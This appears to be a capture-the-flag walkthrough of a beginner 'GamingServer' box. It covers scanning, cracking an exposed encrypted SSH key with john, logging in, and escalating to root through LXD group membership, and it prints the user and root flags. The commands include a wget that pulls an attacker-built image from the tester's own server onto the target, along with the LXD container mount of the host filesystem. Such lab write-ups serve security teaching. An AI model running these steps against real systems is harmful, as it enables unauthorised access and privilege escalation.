# GamingServer

## Description

An Easy Boot2Root box for beginners

Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.

## Initial Scan

Let's start with an Nmap scan. The scan reveals two open ports:

* 22 ssh
* 80 http

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Webpage

Let's start with the webpage, since we can't have initial access to ssh service. I started by looking through the source code and found a comment for someone named `john` which can be a possible username:

~~~
└─$ curl -s "http://$IP:80/" | grep '<!--'
<!-- Website template by freewebsitetemplates.com -->
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
~~~

I couldn't find much more from the webpage, so I decided to run `dirsearch` on it to see if I can find any interesting stuff:

~~~
└─$ dirsearch -u http://$IP:80/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220520

Output File: /home/user/.dirsearch/reports/10.10.30.213/_21-12-18_10-29-57.txt

Error Log: /home/user/.dirsearch/logs/errors-21-12-18_10-29-57.log

Target: http://10.10.30.213:80/

[10:29:57] Starting: 
[10:30:02] 301 -  312B  - /uploads  ->  http://10.10.30.213/uploads/
[10:31:25] 301 -  311B  - /secret  ->  http://10.10.30.213/secret/
[10:51:12] 403 -  276B  - /server-status
~~~

We found two directories: `/secret` and `/uploads`. Let's start with `/secret`. It contains a file named `secretKey`:

~~~
└─$ curl -s "http://$IP:80/secret/" | html2text
****** Index of /secret ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                   - 
[[   ]]       secretKey        2020-02-05 13:41 1.7K 
===========================================================================
     Apache/2.4.29 (Ubuntu) Server at 10.10.30.213 Port 80
~~~

I downloaded the file and after reading it, I realized that it is an RSA private key, but we need a password to use it:

~~~
└─$ cat secretKey                              
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx

[REDACTED]

v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
~~~

Before messing around with the private key, let's take a look at the other directory: `/uploads` (We could find this dirctory from `/robots.txt` too.):

~~~
└─$ curl -s "http://$IP:80/uploads/" | html2text
****** Index of /uploads ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                   - 
[[   ]]       dict.lst         2020-02-05 14:10 2.0K 
[[TXT]]       manifesto.txt    2020-02-05 13:05 3.0K 
[[IMG]]       meme.jpg         2020-02-05 13:32  15K 
===========================================================================
     Apache/2.4.29 (Ubuntu) Server at 10.10.30.213 Port 80
~~~

There are three files inside this directory. I downloaded all of them to take a look at them. `meme.jpg` is an image and I couldn't extract anything from it.

`manifesto.txt` is a small essay written by a computer security hacker who went by the handle of The Mentor (It's a real thing). It's a really beautiful and read worthy essay.

## Connecting to SSH

`dict.lst` is a wordlist. I decided to use it to brute-force the password for the private key. First I used a tool called `ssh2john` which changes the format of the key to a crackable forma for `john`. Then I used `john` and `dict.lst` to crack the password:

~~~
└─$ /usr/share/john/ssh2john.py secretKey > priv.hash
                                                                                                                      
└─$ john --wordlist=./dict.lst priv.hash                                 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secretKey)     
1g 0:00:00:00 DONE (2021-12-19 01:36) 100.0g/s 22200p/s 22200c/s 22200C/s 2003..starwars
~~~

Great! We found the password of the private key (`letmein`) and have a possible username (`john`), so let's try to connect to the machine via ssh. First set the permission of the key to 600 and then use it:

~~~
└─$ chmod 600 secretKey
                                                                                                                      
└─$ ssh -i secretKey john@$IP 
Enter passphrase for key 'secretKey': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

[REDACTED]

john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
~~~

We're in!

## User Flag

By listing the files in `john`'s home directory, we can see that the file containing the user flag is here:

~~~
john@exploitable:~$ ls
user.txt
john@exploitable:~$ cat user.txt 
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
~~~

User flag: `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`

## Privilege Escalation

Now we need to gain root access. We can't run `sudo -l` because we don't have john's password, but if you pay attention to result of `id` command, you can see that user `john` is in `lxd` group:

~~~
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
                                                                                              ^^^^^^^^
~~~

I searched for privilege escalation with `lxd` and found this [article](https://www.hackingarticles.in/lxd-privilege-escalation/) which walks us through the process. Follow the steps below to build alpine and start a server to upload it to the target machine:

* **Note:** If the building process doesn't work, try using a VPN. If you still have a problem, check the "Issue" section in the repository, because you might need to change a part of the code like I did.

On your machine:

~~~
# git clone https://github.com/saghul/lxd-alpine-builder.git
# cd lxd-alpine-builder
# ./build-alpine
# python3 http.server 8000
~~~

Now there should be a newly created tar file. Let's head back to the target machine and downlaod that file:

~~~
$ wget http://<YOUR IP>:8000/<NAME OF THE NEWLY CREATED TAR FILE>
~~~

Now that we have uploaded our file, we can move forward and import the image:

~~~
john@exploitable:~$ lxc image import ./alpine-v3.15-x86_64-20211219_0353.tar.gz --alias myimage
~~~

Let's list lxc images to see if it worked:

~~~
john@exploitable:~$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | b97d55b690d3 | no     | alpine v3.15 (20211219_03:53) | x86_64 | 3.65MB | Dec 19, 2021 at 9:24am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
~~~

As you can see, our image has been added. Now we can complete the process:

~~~
john@exploitable:~$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:~$ lxc start ignite
john@exploitable:~$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~~~

Great! Now we are root.

## Root Flag

The root flag isn't located in `/root` which is where it usually is, so let's find it:

~~~
~ # find / -type f -name "root.txt" 2>/dev/null
/mnt/root/root/root.txt
~~~

We found it. Let's read it and finish the challenge:

~~~
~ # cat /mnt/root/root/root.txt 
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
~~~

Root flag: `2e337b8c9f3aff0c2b3e8d4e6a7c88fc`

# D0N3! ; )

Thanks to the creator(s) of this room!

Hope you had fun and learned something.

Have a g00d 0ne! : )